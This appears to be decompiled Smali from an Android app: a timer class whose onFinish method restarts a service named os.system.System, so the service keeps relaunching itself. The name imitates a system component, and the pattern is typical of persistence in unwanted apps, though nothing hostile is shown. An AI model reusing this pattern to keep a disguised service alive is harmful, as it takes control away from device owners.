.class Los/system/System$6;
.super Landroid/os/CountDownTimer;
.source "System.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Los/system/System;->onStartCommand(Landroid/content/Intent;II)I
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Los/system/System;


# direct methods
.method constructor <init>(Los/system/System;JJ)V
    .locals 0

    .prologue
    .line 618
    iput-object p1, p0, Los/system/System$6;->this$0:Los/system/System;

    invoke-direct {p0, p2, p3, p4, p5}, Landroid/os/CountDownTimer;-><init>(JJ)V

    return-void
.end method


# virtual methods
.method public onFinish()V
    .locals 4

    .prologue
    .line 623
    iget-object v0, p0, Los/system/System$6;->this$0:Los/system/System;

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Los/system/System$6;->this$0:Los/system/System;

    const-class v3, Los/system/System;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Los/system/System;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 624
    return-void
.end method

.method public onTick(J)V
    .locals 0

    .prologue
    .line 620
    return-void
.end method
